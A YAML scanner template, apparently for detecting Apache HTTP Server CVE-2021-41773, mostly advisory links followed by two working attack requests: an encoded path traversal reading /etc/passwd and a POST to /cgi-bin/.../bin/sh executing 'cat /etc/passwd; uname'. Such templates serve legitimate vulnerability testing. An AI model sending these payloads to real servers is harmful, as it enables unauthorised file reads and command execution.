name: yaml-poc-apache-http_server-directory_traversal-CVE-2021-41773
binding: 055003a3-5b23-451d-b813-a27acd386af2
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/164418/Apache-HTTP-Server-2.4.49-Path-Traversal-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/164418/Apache-HTTP-Server-2.4.49-Path-Traversal.html
        - http://packetstormsecurity.com/files/164629/Apache-2.4.49-2.4.50-Traversal-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/164941/Apache-HTTP-Server-2.4.50-Remote-Code-Execution.html
        - http://www.openwall.com/lists/oss-security/2021/10/05/2
        - http://www.openwall.com/lists/oss-security/2021/10/07/1
        - http://www.openwall.com/lists/oss-security/2021/10/07/6
        - http://www.openwall.com/lists/oss-security/2021/10/08/1
        - http://www.openwall.com/lists/oss-security/2021/10/08/2
        - http://www.openwall.com/lists/oss-security/2021/10/08/3
        - http://www.openwall.com/lists/oss-security/2021/10/08/4
        - http://www.openwall.com/lists/oss-security/2021/10/08/5
        - http://www.openwall.com/lists/oss-security/2021/10/08/6
        - http://www.openwall.com/lists/oss-security/2021/10/09/1
        - http://www.openwall.com/lists/oss-security/2021/10/11/4
        - http://www.openwall.com/lists/oss-security/2021/10/15/3
        - http://www.openwall.com/lists/oss-security/2021/10/16/1
        - httpd-pathtrv-LAzg68cZ
        - httpd.apache.org%3E
        - httpd.apache.org/security/vulnerabilities_24.html
        - https://access.redhat.com/security/cve/cve-2021-41773
        - https://cxsecurity.com/issue/WLB-2021110108
        - https://help.aliyun.com/noticelist/articleid/1060919610.html
        - https://httpd.apache.org/security/vulnerabilities_24.html
        - https://lists.apache.org/thread.html/r17a4c6ce9aff662efd9459e9d1850ab4a611cb23392fc68264c72cb3%40%3Ccvs.httpd.apache.org%3E
        - https://lists.apache.org/thread.html/r17a4c6ce9aff662efd9459e9d1850ab4a611cb23392fc68264c72cb3@%3Ccvs.
        - https://lists.apache.org/thread.html/r17a4c6ce9aff662efd9459e9d1850ab4a611cb23392fc68264c72cb3@%3Ccvs.httpd.apache.org%3E
        - https://lists.apache.org/thread.html/r6abf5f2ba6f1aa8b1030f95367aaf17660c4e4c78cb2338aee18982f%40%3Cusers.httpd.apache.org%3E
        - https://lists.apache.org/thread.html/r6abf5f2ba6f1aa8b1030f95367aaf17660c4e4c78cb2338aee18982f@%3Cusers.
        - https://lists.apache.org/thread.html/r6abf5f2ba6f1aa8b1030f95367aaf17660c4e4c78cb2338aee18982f@%3Cusers.httpd.apache.org%3E
        - https://lists.apache.org/thread.html/r7c795cd45a3384d4d27e57618a215b0ed19cb6ca8eb070061ad5d837%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r7c795cd45a3384d4d27e57618a215b0ed19cb6ca8eb070061ad5d837@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r98d704ed4377ed889d40479db79ed1ee2f43b2ebdd79ce84b042df45%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r98d704ed4377ed889d40479db79ed1ee2f43b2ebdd79ce84b042df45@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/rb5b0e46f179f60b0c70204656bc52fcb558e961cb4d06a971e9e3efb%40%3Cusers.httpd.apache.org%3E
        - https://lists.apache.org/thread.html/rb5b0e46f179f60b0c70204656bc52fcb558e961cb4d06a971e9e3efb@%3Cusers.
        - https://lists.apache.org/thread.html/rb5b0e46f179f60b0c70204656bc52fcb558e961cb4d06a971e9e3efb@%3Cusers.httpd.apache.org%3E
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RMIIEFINL6FUIOPD2A3M5XC6DH45Y3CC/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/WS5RVHOIIRECG65ZBTZY7IEJVWQSQPG3/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RMIIEFINL6FUIOPD2A3M5XC6DH45Y3CC/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WS5RVHOIIRECG65ZBTZY7IEJVWQSQPG3/
        - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
        - https://packetstormsecurity.com/files/164418/Apache-HTTP-Server-2.4.49-Path-Traversal-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/164418/Apache-HTTP-Server-2.4.49-Path-Traversal.html
        - https://packetstormsecurity.com/files/164629/Apache-2.4.49-2.4.50-Traversal-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/164941/Apache-HTTP-Server-2.4.50-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/168072/Gentoo-Linux-Security-Advisory-202208-20.html
        - https://security.gentoo.org/glsa/202208-20
        - https://security.netapp.com/advisory/ntap-20211029-0009/
        - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-
        - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-httpd-pathtrv-LAzg68cZ
        - https://vigilance.fr/vulnerability/Apache-HTTP-Server-2-4-49-directory-traversal-via-Path-Normalization-36592
        - https://www.auscert.org.au/bulletins/ESB-2021.3287
        - https://www.auscert.org.au/bulletins/ESB-2021.3348
        - https://www.cybersecurity-help.cz/vdb/SB2021100601
        - https://www.cybersecurity-help.cz/vdb/SB2021100802
        - https://www.cybersecurity-help.cz/vdb/SB2021101513
        - https://www.exploit-db.com/exploits/50383
        - https://www.oracle.com/security-alerts/cpujan2022.html
    vulnerability:
        id: e3c872f6-3d31-4b8c-8b16-137f8a39034a
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: POST
            path: /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: 'echo Content-Type: text/plain; echo; cat /etc/passwd; uname'
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0() || r1()
